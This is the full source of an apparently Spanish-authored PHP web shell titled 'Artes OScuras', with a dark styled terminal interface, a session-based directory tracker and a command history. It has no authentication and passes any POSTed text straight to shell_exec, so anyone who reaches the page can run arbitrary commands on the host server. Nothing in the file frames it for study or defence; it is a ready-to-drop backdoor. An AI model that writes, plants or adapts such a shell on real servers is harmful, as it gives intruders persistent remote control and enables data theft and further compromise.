<?php
session_start();

// Configura el directorio inicial si no existe
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd(); // Directorio actual al iniciar el script
}

// Inicia el historial de comandos si no existe
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = '';
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $command = $_POST["command"];

    if (!empty($command)) {
        // Si el comando es "clear", reinicia el historial
        if (trim($command) === 'clear') {
            $_SESSION['history'] = ''; // Borra el historial
            $output = "Historial de comandos borrado.";
        } elseif (strpos($command, 'cd ') === 0) {
            // Si el comando es "cd", intenta cambiar el directorio en la sesión
            $newDir = substr($command, 3); // Obtiene la ruta después de "cd "
            if (chdir($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $newDir)) {
                $_SESSION['current_dir'] = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $newDir);
                $output = ""; // Limpia la salida si el cambio de directorio es exitoso
            } else {
                $output = "Error: No se pudo cambiar al directorio " . htmlspecialchars($newDir);
            }
        } else {
            // Ejecuta el comando en el directorio actual
            chdir($_SESSION['current_dir']);
            $output = shell_exec($command . ' 2>&1'); // Ejecuta y captura errores
        }

        // Agrega el comando y su salida al final del historial, excepto cuando se usa "clear"
        if (trim($command) !== 'clear') {
            // Incluir el directorio actual en el historial
            $currentDir = htmlspecialchars($_SESSION['current_dir']);
            $_SESSION['history'] .= "<span style='color: #a0a0a0;'>$currentDir $ " . htmlspecialchars($command) . "</span><br>" .
                                    "<pre>" . htmlspecialchars($output) . "</pre><br>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>PHP Shell</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #1e1e1e; /* Fondo general */
            color: #e0e0e0;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
            position: relative; /* Para posicionar el fondo correctamente */
        }

        /* Dibujo en ASCII centrado */
        .ascii-background {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%); /* Centra el dibujo */
            z-index: 0; /* Coloca el fondo detrás */
            color: rgba(255, 255, 255, 1); /* Color blanco sin transparencia */
            white-space: pre; /* Mantiene el formato del texto en ASCII */
            font-family: 'Courier New', Courier, monospace; /* Fuente monoespaciada */
            padding: 20px; /* Espaciado para que no se pegue a los bordes */
        }

        .output-container {
            flex: 1;
            padding: 30px; /* Aumentar padding para más espacio */
            overflow-y: auto;
            background-color: rgba(34, 34, 34, 0.55); /* Fondo oscuro ligeramente transparente */
            border-bottom: 1px solid #333;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            position: relative; /* Para apilar correctamente */
            z-index: 1; /* Coloca la ventana delante del fondo */
            backdrop-filter: blur(5px); /* Desenfoque para mejorar la legibilidad */
        }

        h1 {
            color: #b0b0b0;
            font-size: 30px;
            text-align: center;
            margin-bottom: 10px;
        }

        .history {
            font-size: 19px; /* Aumentar el tamaño de la fuente */
            line-height: 1.8; /* Aumentar la altura de línea para mayor claridad */
            font-family: 'Courier New', Courier, monospace;
            padding: 20px; /* Aumentar el padding */
            height: 100%;
            overflow-y: auto;
            color: #e0e0e0; /* Color del texto */
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5); /* Sombra para mejor legibilidad */
        }

        .command-output {
            background-color: transparent; /* Fondo transparente para la salida de comandos */
            color: #e0e0e0;
            padding: 15px;
            border-radius: 6px;
            white-space: pre-wrap;
            word-wrap: break-word;
            box-shadow: inset 0px 1px 3px rgba(0, 0, 0, 0.3);
            border: none; /* Sin borde para que no se vea */
        }

        .input-container {
            padding: 15px 20px;
            background-color: #252525; /* Fondo oscuro para el área de entrada */
            border-top: 1px solid #333;
            display: flex;
            align-items: center;
        }

        .prompt {
            color: #b0b0b0;
            font-family: 'Courier New', Courier, monospace;
            font-size: 18px;
            margin-right: 5px;
            display: flex;
            align-items: center;
        }

        .command-input {
            flex: 1;
            padding: 12px;
            font-size: 18px;
            color: #e0e0e0;
            background-color: #1c1c1c; /* Fondo oscuro para el input */
            border: 1px solid #444;
            border-radius: 6px;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
        }

        .command-input::placeholder {
            color: #666;
        }

        input[type="submit"] {
            padding: 8px 16px; /* Ajustar tamaño de padding */
            font-size: 16px; /* Ajustar tamaño de fuente */
            color: #ffffff;
            background-color: #3a3a3a; /* Fondo oscuro */
            border: 1px solid #444;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        input[type="submit"]:hover {
            background-color: #5a5a5a; /* Color de fondo al pasar el ratón */
        }

        /* Estilo de los botones de tamaño */
        .size-button {
            padding: 8px 16px; /* Ajustar tamaño de padding */
            font-size: 16px; /* Ajustar tamaño de fuente */
            color: #ffffff;
            background-color: #3a3a3a; /* Fondo oscuro */
            border: 1px solid #444;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin: 0 5px; /* Espaciado entre botones */
        }

        .size-button:hover {
            background-color: #5a5a5a; /* Color de fondo al pasar el ratón */
        }

        /* Estilo de las barras de desplazamiento */
        ::-webkit-scrollbar {
            width: 12px; /* Ancho de la barra de desplazamiento */
            background-color: #252525; /* Color de fondo de la barra de desplazamiento */
        }

        ::-webkit-scrollbar-thumb {
            background-color: #444; /* Color de la parte móvil de la barra */
            border-radius: 6px; /* Bordes redondeados de la parte móvil */
        }

        ::-webkit-scrollbar-thumb:hover {
            background-color: #666; /* Color al pasar el ratón */
        }

        /* Para Firefox */
        .history {
            scrollbar-color: #444 #252525; /* Color del "thumb" y fondo */
            scrollbar-width: thin; /* Ancho de la barra de desplazamiento */
        }
    </style>
</head>
<body>
    <div class="ascii-background">
        <pre>
                                                                                                    
                                                :-:                                                 
                                             .=#%%%#=.                                              
                                           :*%%%%%%%%%*-                                            
                                         .*%%%%%%%%%%%%%*:                                          
                                        =%%%%%%%%%%%%%%%%%=                                         
                                       *%#%%%%%%%%%%%%%%%%%*                                        
                                     .###%%%%%%%%%%%%%%%%%**#                                       
                                     ##+%%%%%%*=:.:=*%%%%%%+*#                                      
                                    *%+%%%%#=.       .=#%%%%+%*                                     
                                   -%##%%*:             :*%%##%=                                    
                                   #%%%#:                 :#%%%%.                                   
                                  -%%%=                     =%%%=                                   
                                  #%%-                       -%%#                                   
                                  #%= .                     : -%%                                   
                                  ## .:.                   .-. ##                                   
                                  :* .-+.                  +=: *-     .                             
                                .: :..*%*                 *%#. - :    +                             
                                :%+   -%%*.              *%%+   +%.  *=                             
                              .-*%%#=. :*%%-           :#%*-  -#%=  *#  -                           
                             ::.   .:-:. .=*+:       .+#+.  -**-  :#%. :+                           
                              .--====--:.   .:-.    -=:   .::   .*@*. .#:                           
                           =*#####***######*=:..              :*%%-  :%= ..                         
                         -++-.           .:-+***+=:        :=#@%=.  -%=  -                          
                         .    .-==++++==-.      .::.   .-+#@%*-   :#%-  +:                          
                          .=*##**+=========-:.     :=*#%@%*-.   :*%*.  += .                         
                         +*=:.               .:=*#%@@%*=:    .-#%*:  :#= :.                         
                        -:     .:---:.   .-+#%@@%*+-.     .-*%%*:   +#: :-                          
                            :---:..   .=*%@@#+-:       :=*%%*-.  .+#+  -+                           
                          .--:      -*%@%*=.       :=*#%#+-.   .+%*:  ==                            
                         ::.      -#@@*=.      :-+*##+=:    .-*#+:  :=-                             
                         :      :#@%+:      :-+**+=:     .-+**-.  .-=:                              
                               =@%*.     .-=++=-.     .-=++=:   .-=-.                               
                              +@#:     .-===-.     .-=+=-.    .-=-.                                 
                             =@=      -==-:      :-==-.     .---.                                   
                            :%:     :---.      :---.      :--:.                                     
                            *:     :--:      :--:       :--:                                        
                           ::     :-:      .::.       :::.                                          
                           .     .:.      .:.       .:..                                            
                                .:.      ::.      .:.                                               
                                ..      :.       ..                                                 
                                       ..       .                                                   
        </pre>
    </div>

    <div class="output-container" id="output-container">
        <h1>Artes OScuras</h1>
        <div class="history" id="history">
            <?php
            // Muestra el historial completo de comandos y salidas
            echo $_SESSION['history'];
            ?>
        </div>
        <div class="button-container" style="margin-top: 10px;">
            <button class="size-button" id="increase-btn">Increase size</button>
            <button class="size-button" id="decrease-btn">Reduce size</button>
        </div>
    </div>

    <div class="input-container">
        <form method="post" style="display: flex; width: 100%;">
            <span class="prompt"><?php echo htmlspecialchars($_SESSION['current_dir']) . ' $'; ?></span>
            <input type="text" name="command" id="command" class="command-input" placeholder="Escribe un comando">
            <input type="submit" value="Exec">
        </form>
    </div>

    <script>
        // Foco automático en el campo de comando después de cargar la página
        document.getElementById("command").focus();

        // Desplazamiento automático hacia abajo en el contenedor de salida
        const historyContainer = document.getElementById("history");
        
        function scrollToBottom() {
            historyContainer.scrollTop = historyContainer.scrollHeight; // Desplaza al final
        }

        scrollToBottom(); // Llama a la función al cargar la página

        // Ajuste de tamaño de fuente
        const historyElement = document.getElementById("history");
        let fontSize = localStorage.getItem('fontSize') ? parseInt(localStorage.getItem('fontSize')) : 19; // Tamaño de fuente inicial

        // Aplicar tamaño de fuente desde localStorage
        historyElement.style.fontSize = fontSize + 'px';

        document.getElementById("increase-btn").addEventListener("click", function() {
            fontSize += 1; // Incrementar tamaño
            historyElement.style.fontSize = fontSize + 'px'; // Aplicar nuevo tamaño
            localStorage.setItem('fontSize', fontSize); // Guardar en localStorage
        });

        document.getElementById("decrease-btn").addEventListener("click", function() {
            if (fontSize > 12) { // Limitar el tamaño mínimo
                fontSize -= 1; // Reducir tamaño
                historyElement.style.fontSize = fontSize + 'px'; // Aplicar nuevo tamaño
                localStorage.setItem('fontSize', fontSize); // Guardar en localStorage
            }
        });

        // Escucha el evento de envío del formulario para desplazar al final después de cada comando
        document.querySelector("form").addEventListener("submit", scrollToBottom);
    </script>
</body>
</html>
